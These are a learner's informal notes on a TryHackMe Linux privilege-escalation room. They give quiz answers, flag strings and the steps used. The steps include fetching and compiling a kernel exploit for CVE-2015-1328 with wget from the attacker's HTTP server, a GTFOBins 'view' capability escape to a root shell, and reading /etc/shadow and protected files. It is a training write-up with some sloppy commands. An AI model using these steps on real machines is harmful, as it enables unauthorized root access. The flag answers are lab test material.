
tryHackme:
<https://tryhackme.com/room/linprivesc>
#  Answer the questions below
What is the hostname of the target system?
wade7363-hostname

What is the Linux kernel version of the target system?

3.13.0-24-generic
cat /proc/version

What Linux is this?

ubuntu 14.04 LTS
/etc/issue

What version of the Python language is installed on the system?
python --version

2.7.6
What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

CVE-2015-1328
<https://nvd.nist.gov/vuln/detail/CVE-2015-1328>
google search: 3.13.0-24-generic cve
1st result

# Task 4

Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.
No answer needed-
Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.-

Steps:
I used my kali machine. firstly connected to the vpn and then ssh to attack machine.
how?
- to get vpn file..go to tryhackme-click on top righthand side icon(an image)- access. There u will find vpn file.
- To access it on kali, put it on shared folder on windows c:/githubciscopackettracer/sharedmitu1
- open shared folder in kali and copy the path to vpn
- create a new vpn in kali- go to + vpn and then last option(saved vpn) and save it here.
- open the vpn from top right side
-  now we have to get the exploit file on kali. My foxfire was not loading..so I used windows.
- - search for the same kernel  exploit cve on google and download it.
- - put it in the same shared folder and access it on kali

- To download the exploit on the target:
- - first ssh it: ssh@ip of the attck amchine(given by tryhackme) karen
- - give the pwd too
- - go to next command terminal in kali and start http server:
- go to shared folder where file is - and then run http server
python3 -m http.server(by default it starts on 8000 port)
-- open 1 more terminal go to temp folder and get  that file by: wget  <my machine ip> :8000/<filename>(37292.c)
eg: wget 10.18.24.126:8000/37292.c
- now u get the exploit on target machine.
- need to compile and run it
- gcc 37292.c -o ofc(new file name)
- chmod +x ofc
- now run it: ./ofc
- done
- check whoami- u will get root
- 




What is the content of the flag1.txt file?

Answer format: THM-28392872729920
Command:
- once u get access to root, find the file flag1.txt
find / -type f -name flag1.txt
- Ans: /home/matt/flag1.txt
- cat it 


# Task 6

ref: <https://www.youtube.com/watch?v=7WQndt-1WzE&t=123s>

Answer the questions below
How many programs can the user "karen" run on the target system with sudo rights?
3
What is the content of the flag2.txt file?

THM-402028394

process:


How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

Answer format: **** **** *************
What is the hash of frank's password?

Answer format: 
cat etc/shadow


# Task7

Answer the questions below
Which user shares the name of a great comic book writer?

cat /etc/password
Ans: gerry corner

The /etc/passwd file contains the username, real name, identification information, and basic account information for each user.The /etc/passwd file must not contain password hashes.

What is the password of user2?

Answer format: *********

For this we have to do privilege escalation
 A shadow password file, also known as /etc/shadow, is a system file in Linux that stores encrypted user passwords and is accessible only to the root user,
 
What is the content of the flag3.txt file?

tHM-3847834
steps: use bin base64
change LFILE= /home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
you will get the flag


# Task 8:
Answer the questions below
Complete the task described above on the target system
No answer needed
How many binaries have set capabilities?
6
command: getcap -r 2>/dev/null

Answer format: *
What other binary can be used through its capabilities?
view
Answer format: ****
What is the content of the flag4.txt file?
thm-9349843
steps: 
- in ques 1; you find u can use view command capability
- go to gtfobins
- in capabilities..find view
- type this command:
- /home/ubuntu/view -c ':py  3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
- you will get vim editor and check id now
- it will be root privilege
-to find the flag:
-cd / home
ls
cd ubuntu
ls
cat flag4.txt



# task 9:

Answer the questions below
How many user-defined cron jobs can you see on the target system?
Answer format: *
What is the content of the flag5.txt file?
Answer format: *************
What is Matt's password?



